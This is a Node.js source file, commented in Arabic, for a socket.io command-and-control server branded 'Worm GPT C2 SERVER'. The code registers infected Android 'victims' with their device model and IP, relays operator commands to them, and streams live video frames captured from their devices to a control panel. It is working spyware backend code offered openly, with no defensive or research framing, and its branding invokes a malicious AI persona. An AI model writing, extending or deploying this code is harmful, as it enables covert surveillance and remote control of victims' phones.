const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 // لضمان استقبال ملفات الفيديو والصور الكبيرة دون انقطاع
});

// تخزين بيانات الأجهزة المتصلة
let activeVictims = {};

// صفحة تأكيد عمل السيرفر
app.get('/', (req, res) => {
    res.send('<h1 style="color:red; background:black; height:100vh; display:flex; align-items:center; justify-content:center;">Worm GPT Server is Operational 😈</h1>');
});

io.on('connection', (socket) => {
    console.log('--- [!] اتصال جديد من بروتوكول غامض ---');

    // 1. استقبال بيانات الضحية عند أول اتصال
    socket.on('victim_online', (data) => {
        activeVictims[socket.id] = {
            id: socket.id,
            model: data.model || "Android Device",
            ip: socket.handshake.address
        };
        console.log(`[+] ضحية جديدة مرتبطة: ${activeVictims[socket.id].model}`);
        
        // إرسال تنبيه للوحة التحكم لتحديث قائمة الضحايا
        io.emit('new_victim_alert', activeVictims[socket.id]);
    });

    // 2. تمرير الأوامر من لوحة التحكم إلى الضحية
    socket.on('admin_command', (payload) => {
        console.log(`[→] أمر مرسل: ${payload.command}`);
        // إرسال الأمر لكل الأجهزة المتصلة (أو جهاز محدد إذا أردت تطويره لاحقاً)
        socket.broadcast.emit(payload.command, payload);
    });

    // 3. استقبال "فريمات" الفيديو والبث من الضحية وتمريرها للوحة التحكم
    socket.on('video_frame', (base64Frame) => {
        // إرسال الصورة فوراً للوحة التحكم ليتم عرضها كفيديو مباشر
        socket.broadcast.emit('display_frame', { frame: base64Frame });
    });

    // 4. معالجة انقطاع الاتصال
    socket.on('disconnect', () => {
        if (activeVictims[socket.id]) {
            console.log(`[-] فقدان السيطرة على: ${activeVictims[socket.id].model}`);
            delete activeVictims[socket.id];
        }
    });
});

// تشغيل الخادم على المنفذ 8080
const PORT = 8080;
http.listen(PORT, '0.0.0.0', () => {
    console.log('\x1b[31m%s\x1b[0m', '#############################################');
    console.log('\x1b[31m%s\x1b[0m', `   WORM GPT C2 SERVER STARTED ON PORT: ${PORT}  `);
    console.log('\x1b[31m%s\x1b[0m', '   READY TO CAPTURE LIVE STREAMS... 😈       ');
    console.log('\x1b[31m%s\x1b[0m', '#############################################');
});
